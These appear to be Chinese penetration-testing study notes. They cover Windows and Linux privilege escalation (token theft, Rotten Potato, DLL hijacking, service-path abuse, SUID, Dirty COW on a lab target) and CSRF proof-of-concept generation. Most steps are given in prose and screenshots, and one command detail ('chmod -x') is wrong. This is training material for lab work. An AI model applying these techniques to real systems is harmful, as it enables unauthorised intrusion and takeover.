<h3 id="Oracle数据库提权"><a href="#Oracle数据库提权" class="headerlink" title="Oracle数据库提权"></a>Oracle数据库提权</h3><h6 id="普通用户模式"><a href="#普通用户模式" class="headerlink" title="普通用户模式"></a>普通用户模式</h6><p>前提是拥有一个普通的oracle连接账号，不需要DBA权限，可以提权至DBS，并以oracle实例运行的权限执行操作系统命令。</p>
<h6 id="DBA用户模式（自动化工具演示）"><a href="#DBA用户模式（自动化工具演示）" class="headerlink" title="DBA用户模式（自动化工具演示）"></a>DBA用户模式（自动化工具演示）</h6><p>拥有DBA账号密码，可以省去自己手动去创建存储过程的繁琐步骤，一键执行测试。</p>
<h6 id="注入提升模式（sqlmap演示测试）"><a href="#注入提升模式（sqlmap演示测试）" class="headerlink" title="注入提升模式（sqlmap演示测试）"></a>注入提升模式（sqlmap演示测试）</h6><p>拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证</p>
<h2 id="Redis-amp-Postgre-amp-令牌窃取-amp-进程注入"><a href="#Redis-amp-Postgre-amp-令牌窃取-amp-进程注入" class="headerlink" title="Redis&amp;Postgre&amp;令牌窃取&amp;进程注入"></a>Redis&amp;Postgre&amp;令牌窃取&amp;进程注入</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019133531100.png"
                      alt="image-20221019133531100"
                ></p>
<h3 id="Redis数据库权限提升"><a href="#Redis数据库权限提升" class="headerlink" title="Redis数据库权限提升"></a>Redis数据库权限提升</h3><p>起因：由于Redis服务配置不当，可被攻击者恶意利用。黑客借助Redis内置命令，可将现有数据恶意清空；如果Redis以root身份运行，黑客可以往服务器上写入SSH公钥文件，直接登入服务器。</p>
<p>连接（利用未授权或者有密码）-利用如下方法提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019133947495.png"
                      alt="image-20221019133947495"
                ></p>
<p><a class="link"   href="https://blog.csdn.net/fly_hps/article/details/80937837" >https://blog.csdn.net/fly_hps/article/details/80937837 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019135019394.png"
                      alt="image-20221019135019394"
                ></p>
<h3 id="postgresql数据库提权"><a href="#postgresql数据库提权" class="headerlink" title="postgresql数据库提权"></a>postgresql数据库提权</h3><p>postgresql数据库是一种关系型数据库。其中9.3到11版本中存在一处特性，管理员或者具有“COPY TO&#x2F;FROM PROGRAM”的用户，可以使用这个特性执行任意命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019135525686.png"
                      alt="image-20221019135525686"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019135507395.png"
                      alt="image-20221019135507395"
                ></p>
<h3 id="Windows2008-amp-7令牌窃取提升-本地"><a href="#Windows2008-amp-7令牌窃取提升-本地" class="headerlink" title="Windows2008&amp;7令牌窃取提升-本地"></a>Windows2008&amp;7令牌窃取提升-本地</h3><p>进行全程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。</p>
<p>流程：获取会话—利用模块—窃取令牌—提权</p>
<p>得先利用msf反弹信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019140951226.png"
                      alt="image-20221019140951226"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019141011052.png"
                      alt="image-20221019141011052"
                ></p>
<h3 id="Windows2003-amp-10注入提升"><a href="#Windows2003-amp-10注入提升" class="headerlink" title="Windows2003&amp;10注入提升"></a>Windows2003&amp;10注入提升</h3><p>进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用再windows2008之前的操作系统（不包括），所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统.</p>
<h5 id="win2008之前的系统提权："><a href="#win2008之前的系统提权：" class="headerlink" title="win2008之前的系统提权："></a>win2008之前的系统提权：</h5><p>利用工具</p>
<h5 id="之后："><a href="#之后：" class="headerlink" title="之后："></a>之后：</h5><p>pexec64 工具</p>
<h2 id="烂土豆-amp-dll劫持-amp-引导路径-amp-服务权限—提权"><a href="#烂土豆-amp-dll劫持-amp-引导路径-amp-服务权限—提权" class="headerlink" title="烂土豆&amp;dll劫持&amp;引导路径&amp;服务权限—提权"></a>烂土豆&amp;dll劫持&amp;引导路径&amp;服务权限—提权</h2><h4 id="烂土豆提权"><a href="#烂土豆提权" class="headerlink" title="烂土豆提权"></a>烂土豆提权</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020164246540.png"
                      alt="image-20221020164246540"
                ></p>
<h6 id="烂土豆比热土豆的优点："><a href="#烂土豆比热土豆的优点：" class="headerlink" title="烂土豆比热土豆的优点："></a>烂土豆比热土豆的优点：</h6><p>1.100%可靠</p>
<p>2.全版本通杀</p>
<p>3.立即生效，热土豆需要等待windows更新</p>
<h5 id="烂土豆配合令牌窃取提权-web权限"><a href="#烂土豆配合令牌窃取提权-web权限" class="headerlink" title="烂土豆配合令牌窃取提权-web权限"></a>烂土豆配合令牌窃取提权-web权限</h5><p>过程：上传烂土豆–执行烂土豆–利用窃取模块–窃取system–成功</p>
<p>步骤：</p>
<ol>
<li><p>先下载potato.exe文件并通过webshell上传到靶机中去</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020211128892.png"
                      alt="image-20221020211128892"
                ></p>
</li>
</ol>
<p>2.在msf中先连接到靶机，确保能够反弹shell，然后cd c:\定位到patato.exe的位置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020211348556.png"
                      alt="image-20221020211348556"
                ></p>
<p>3.输入指令，运行patato.exe</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020211438585.png"
                      alt="image-20221020211438585"
                ></p>
<p>4.然后执行令牌窃取的三步骤，即可获得系统权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020212013343.png"
                      alt="image-20221020212013343"
                ></p>
<h4 id="DLL劫持提权"><a href="#DLL劫持提权" class="headerlink" title="DLL劫持提权"></a>DLL劫持提权</h4><p>需要被攻击主机有特定软件应用及启用配合</p>
<p>原理：Windows。程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径给，它会根据下面的顺序进行搜索：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021135233606.png"
                      alt="image-20221021135233606"
                ></p>
<p>步骤：信息收集—进程调试—制作DLL并上传—替换DLL-启动应用后成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021140258406.png"
                      alt="image-20221021140258406"
                ></p>
<p>生成dll文件<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021140358055.png"
                      alt="image-20221021140358055"
                >，用来替换一个第三方软件的dll文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021140440660.png"
                      alt="image-20221021140440660"
                ></p>
<p>上面两个文件是可以替换的，因为这个软件运行的时候会调用这两个文件（用火绒剑查看调用情况），随便替换一个都行。（替换的文件名得改成一样的）</p>
<p>打开文件即可监听到窗口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021142533920.png"
                      alt="image-20221021142533920"
                ></p>
<p>后续就可以利用令牌窃取等进行提权</p>
<h4 id="win2012-不带引号服务路径配合MSF-Web，本地权限"><a href="#win2012-不带引号服务路径配合MSF-Web，本地权限" class="headerlink" title="win2012-不带引号服务路径配合MSF-Web，本地权限"></a>win2012-不带引号服务路径配合MSF-Web，本地权限</h4><p>原理：当windows服务运行时，会发生一下两种情况之一。如果给出了可执行文件，并且引用了完整的路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>
<p>过程：检测引号服务路径（看看有没有引号）—利用路径制作文件并上传–启用服务或重启—调用后成功</p>
<p>原理就是：在一些服务的执行路径中，有些目录没有带引号，这样会使得执行的目录与原来想要执行的目录不同</p>
<p>举个例子：</p>
<p>C:&#x2F;&#x2F;ni  hao&#x2F;jjj.exe</p>
<p>“C:&#x2F;&#x2F;ni  hao&#x2F;jjj.exe”</p>
<p>第一个执行的是ni，第二个才是执行jjj.exe</p>
<p>如果权限够，webshell启动服务的命令sc start 服务名</p>
<p>服务启动则会调用系统权限</p>
<p>所以先用命令查找靶机中（用webshell），没有带引号“”的路径的服务</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021152523741.png"
                      alt="image-20221021152523741" style="zoom:150%;" 
                >

<p>然后查看该服务的路径，并用msf生成一个与服务路径名相同的.exe后门文件，然后通过webshell上传靶机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021152116172.png"
                      alt="image-20221021152116172"
                ></p>
<p>利用服务启动，则会调用该后门文件，msf反弹shell就生效了.</p>
<h4 id="win2012-不安全服务权限配合msf-本地提权"><a href="#win2012-不安全服务权限配合msf-本地提权" class="headerlink" title="win2012-不安全服务权限配合msf-本地提权"></a>win2012-不安全服务权限配合msf-本地提权</h4><p>原理：一般服务中，即使正确的引用服务路径（引号的那个方法就不行了），但也可能存在其他的漏洞&#x2F;由于管理配置错误，用户可能对服务拥有过多的权限，比如，可以直接修改它导致重定向执行文件。</p>
<p>步骤：检测服务权限配置–制作文件并上传–更改服务路径指向-调用后成功</p>
<p>下载文件：<a class="link"   href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk" >https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>第一条命令利用下载的软件寻找具有administrators权限的服务</p>
<p>第二条命令是改变服务路径，将其引导至msf生成的exe后门文件</p>
<p>第三条命令是执行该服务</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021154236469.png"
                      alt="image-20221021154236469" style="zoom:150%;" 
                >

<p>这时peogram.exe文件就被执行了，msf就反弹成功</p>
<h4 id="windows提权总结"><a href="#windows提权总结" class="headerlink" title="windows提权总结"></a>windows提权总结</h4><p>掌握：提权方法对应的层面（远程还是本地）、提权方法对应系统版本、相关文件及后门免杀问题等</p>
<h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022190138371.png"
                      alt="image-20221022190138371"
                ></p>
<h3 id="linux脏牛内核漏洞"><a href="#linux脏牛内核漏洞" class="headerlink" title="linux脏牛内核漏洞"></a>linux脏牛内核漏洞</h3><h4 id="linux提权自动化脚本利用–4个脚本"><a href="#linux提权自动化脚本利用–4个脚本" class="headerlink" title="linux提权自动化脚本利用–4个脚本"></a>linux提权自动化脚本利用–4个脚本</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022190542244.png"
                      alt="image-20221022190542244"
                ></p>
<p>利用工具的信息收集，得到的信息来判断是否具有提权的可能性</p>
<p>步骤：下载好LinEnum.sh并通过webshell上传到靶机中（一般上传到&#x2F;tmp文件夹中，具有打开的权限）</p>
<p>然后对该文件赋予权限chmod -x</p>
<p>之后运行该文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022191955669.png"
                      alt="image-20221022191955669"
                ></p>
<p>得到该系统的各项参数，以便进行后续的提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022192137982.png"
                      alt="image-20221022192137982"
                ></p>
<p>SUID里面看是不是有下面图片那些元素，有就可以利用SUID提权</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022195904933.png"
                      alt="image-20221022195904933" style="zoom:150%;" 
                >

<p>其他的工具也是一样的方法</p>
<h4 id="Linux提权SUID配合脚本提权"><a href="#Linux提权SUID配合脚本提权" class="headerlink" title="Linux提权SUID配合脚本提权"></a>Linux提权SUID配合脚本提权</h4><p>漏洞成因：chmod u+s给予了suid      u-s删除了suid</p>
<p>使程序在运行中受到suid root权限的执行过程导致，就是上面那些执行的时候是调用root权限执行，所以可以利用这一特性来实施提权</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022194323506.png"
                      alt="image-20221022194323506" style="zoom:150%;" 
                >

<p>提权过程：探针是否有SUID可以用上图的手工命令，也可以中自动脚本</p>
<p>步骤：</p>
<p>利用msf进行反弹连接，连接三步骤</p>
<p>然后利用upload命令将信息收集工具上传到靶机目录（一般是&#x2F;tmp目录）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022200754775.png"
                      alt="image-20221022200754775"
                ></p>
<p>然后输入shell进行工具的定位及使用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022200638234.png"
                      alt="image-20221022200638234"
                ></p>
<p>发现SUID FILE具有find字样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022201035132.png"
                      alt="image-20221022201035132"
                ></p>
<p>说明可以利用SUID提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022201212416.png"
                      alt="image-20221022201212416"
                ></p>
<p>利用上面的指令，先touch +名字  然后find 名字  -exec whoami  ; 即可发现是root权限</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022201254320.png"
                      alt="image-20221022201254320" style="zoom:150%;" 
                >

<p>然后利用<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022201600033.png"
                      alt="image-20221022201600033"
                >命令即可反弹一个具有root权限的shell</p>
<p>这时候指令前面就可以省略 find  +名字</p>
<h4 id="Linux提权本地配合内核漏洞提权"><a href="#Linux提权本地配合内核漏洞提权" class="headerlink" title="Linux提权本地配合内核漏洞提权"></a>Linux提权本地配合内核漏洞提权</h4><p>提权过程：连接—获取可利用漏洞—下载或者上传exp—编译exp—给权限执行—提权成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022202857938.png"
                      alt="image-20221022202857938"
                ></p>
<p>利用刚才上面所讲的工具利用的方法运行漏洞探针工具</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022203820926.png"
                      alt="image-20221022203820926" style="zoom:150%;" 
                >

<p>找到需要的漏洞，就是最后一个，打开附带的连接将exploits改为download即可下载漏洞，或者直接网上下载文件45010.c文件</p>
<p>将下载好的文件上传上去</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022204141443.png"
                      alt="image-20221022204141443"
                ></p>
<p>然后执行.&#x2F;45010，即可获得root权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022204216654.png"
                      alt="image-20221022204216654"
                ></p>
<h4 id="Linux提权脏牛内核漏洞"><a href="#Linux提权脏牛内核漏洞" class="headerlink" title="Linux提权脏牛内核漏洞"></a>Linux提权脏牛内核漏洞</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022204555115.png"
                      alt="image-20221022204555115"
                ></p>
<p>步骤：vulnhub靶机—探针目标—CMS漏洞利用—脚本探针提权漏洞—利用内核提权</p>
<h5 id="脏牛提权靶机演示"><a href="#脏牛提权靶机演示" class="headerlink" title="脏牛提权靶机演示"></a>脏牛提权靶机演示</h5><p>准备工作：先将靶机下载好安装在vm虚拟机上，开启靶机以及一台kali攻击机</p>
<p>利用kali的ifconfig命令查看自己的IP地址以获取靶机的IP网段</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022205245255.png"
                      alt="image-20221022205245255"
                ></p>
<p>可知靶机的IP地址处于192.168.76.0&#x2F;24网段，利用nmap扫描网段内的活跃主机，获取IP地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022205448204.png"
                      alt="image-20221022205448204"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022205536430.png"
                      alt="image-20221022205536430"
                ></p>
<p>得到IP地址192.168.76.141，继续对该IP进行端口扫描，发现1898端口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022205702744.png"
                      alt="image-20221022205702744"
                ></p>
<p>打开192.168.76.141:1898网站发现该网站是基于drupal开发的，下一步便可以网上搜索该框架的漏洞</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210118051.png"
                      alt="image-20221022210118051"  
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210143398.png"
                      alt="image-20221022210143398" style="zoom:200%;" 
                >

<p>或者也可以利用msf的search功能进行漏洞查找</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210236441.png"
                      alt="image-20221022210236441"
                ></p>
<p>利用这个漏洞，就是第四个</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210355497.png"
                      alt="image-20221022210355497"
                ></p>
<p>设置靶机主机及端口获得反弹shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210501903.png"
                      alt="image-20221022210501903"
                ></p>
<p>接下来就是要开始提权了</p>
<p>上传漏洞探针工具到靶机，并且验证是否上传成功</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210837819.png"
                      alt="image-20221022210837819" style="zoom:150%;" 
                >

<p>然后利用shell模块执行上传的工具</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210959042.png"
                      alt="image-20221022210959042" style="zoom:150%;" 
                >	 	 	 		

<p>发现这一个漏洞，俗称脏牛漏洞</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022211113039.png"
                      alt="image-20221022211113039" style="zoom:150%;" 
                >

<p>访问给出的连接，下载漏洞<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022211342944.png"
                      alt="image-20221022211342944"
                ></p>
<p>下载后上传<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022211520869.png"
                      alt="image-20221022211520869"
                >上传到对方目录文件重命名为40847.cpp</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022211842805.png"
                      alt="image-20221022211842805" style="zoom:150%;" 
                >

<p>因为是.cpp文件所以需要进行编译，第一行为编译命令，就会生成一个dcow文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212012161.png"
                      alt="image-20221022212012161" style="zoom:150%;" 
                >

<p>由于该漏洞利用具有交互式，得确保交互式才能正常回显，所以需要第二行的命令来开启交互式<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212514715.png"
                      alt="image-20221022212514715"
                ></p>
<p>然后运行.&#x2F;dcow即可得到一个root账户的密码</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212609301.png"
                      alt="image-20221022212609301" style="zoom:150%;" 
                >

<p>然后切换root账户进行登入<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212727952.png"
                      alt="image-20221022212727952"
                ></p>
<p>获得root权限<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212746567.png"
                      alt="image-20221022212746567"
                ></p>
<p>然后就可以访问&#x2F;root目录下的文件发现有一个flag.txt文件，访问flag.txt就可以得到flag</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212927461.png"
                      alt="image-20221022212927461" style="zoom:150%;" 
                >

<p>完成！！！</p>
<h3 id="Linux环境变量-amp-定时任务-amp-数据库"><a href="#Linux环境变量-amp-定时任务-amp-数据库" class="headerlink" title="Linux环境变量&amp;定时任务&amp;数据库"></a>Linux环境变量&amp;定时任务&amp;数据库</h3><h4 id="Linux提权本地环境变量安全"><a href="#Linux提权本地环境变量安全" class="headerlink" title="Linux提权本地环境变量安全"></a>Linux提权本地环境变量安全</h4><p>配合SUID进行环境变量提权-本地用户环境下</p>
<p>过程：手写调用文件—编译—复制文件—增加环境变量—执行触发</p>
<p>步骤：</p>
<p>通过命令<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024162713543.png"
                      alt="image-20221024162713543"
                ></p>
<p>将demo.c文件编译成shell文件</p>
<p>demo.c源代码<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024162933036.png"
                      alt="image-20221024162933036"
                ></p>
<p>就是执行ps文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024162333961.png"
                      alt="image-20221024162333961" style="zoom:200%;" 
                >



<p>加个.&#x2F;ps就是执行sh了</p>
<p>在变量PATH&#x3D;&#x2F;tmp中添加&#x2F;tmp变量，执行的是ps（当时实际上执行的是sh）</p>
<p>执行shell文件实际上就是demo.c文件，源代码是运行ps但是实际上是运行了sh，造成root权限</p>
<p>那为什么是运行sh呢？ 前面说过正常输入ps其实就是运行ps，只有.&#x2F;ps才能调用sh运行，但是因为前面设置了环境变量&#x2F;tmp所以默认是调用tmp里面的ps，也就是运行sh</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024163227059.png"
                      alt="image-20221024163227059" style="zoom:150%;" 
                >







<h4 id="Linux定时任务安全–本地"><a href="#Linux定时任务安全–本地" class="headerlink" title="Linux定时任务安全–本地"></a>Linux定时任务安全–本地</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024165155471.png"
                      alt="image-20221024165155471"
                ></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024210529479.png"
                      alt="image-20221024210529479" style="zoom:150%;" 
                >

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027213507541.png"
                      alt="image-20221027213507541"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027221254785.png"
                      alt="image-20221027221254785"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027221305324.png"
                      alt="image-20221027221305324"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027222303044.png"
                      alt="image-20221027222303044"
                ></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027223034688.png"
                      alt="image-20221027223034688" style="zoom:150%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027223233692.png"
                      alt="image-20221027223233692" style="zoom:150%;" 
                >
]]></content>
  </entry>
  <entry>
    <title>CSRF漏洞</title>
    <url>/2023/04/14/CSRF%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>在CSRF场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后去欺骗用户点击，一旦点击了之后，攻击完成</p>
<p>他虽然与XSS类似但是不是一个概念</p>
<p>XSS时盗取用户权限来进行攻击的</p>
<p>而CSRF是利用用户已经进入的权限进行攻击的</p>
<h2 id="CSRF类型"><a href="#CSRF类型" class="headerlink" title="CSRF类型"></a>CSRF类型</h2><h6 id="get请求型"><a href="#get请求型" class="headerlink" title="get请求型"></a>get请求型</h6><p>只需要构造一个URL，然后诱骗用户访问</p>
<h6 id="POST请求型"><a href="#POST请求型" class="headerlink" title="POST请求型"></a>POST请求型</h6><p>构造自动提交的表单，诱导用户访问或者点击</p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>一句话就能概括：就是盗用受害者的身份，利用他的权限，他能干啥攻击者就能干啥</p>
<h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>寻找有权限进行增删改查的功能点：修改密码啥的，然后利用不让burpsuite构造HTML修改这些表单中的某些参数</p>
<h2 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h2><p>一般来说抓取一个正常的请求包，如果没有referer字段和token的话那么极有可能会存在CSRF漏洞</p>
<p>由referer字段，去掉这个字段后再次提交，如果还有效，那么基本上确定由CSRF漏洞了</p>
<p>可以利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等<br>使用burpsuite快速生成CSRF poc</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>可以使用burpsuite里面的engagement tools中的generate CSRF POC模块</p>
<p>前提用户已经登入系统</p>
<p>修改信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414170737994.png"
                      alt="image-20230414170737994"
                ></p>
<p>点击submit抓包</p>
<p>抓到数据包之后</p>
<p>在proxy模块右键找到engagement tools中的generate CSRF POC即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414170158361.png"
                      alt="image-20230414170158361"
                ></p>
<p>然后点击test in browser（这个一般是用于本地的测试），复制url</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414170544874.png"
                      alt="image-20230414170544874"
                ></p>
<p>在代理浏览器上访问</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414170907401.png"
                      alt="image-20230414170907401"
                ></p>
<p>点击submit request即可修改用户信息</p>
<p>远程的是点击copy html</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414170926390.png"
                      alt="image-20230414170926390"
                ></p>
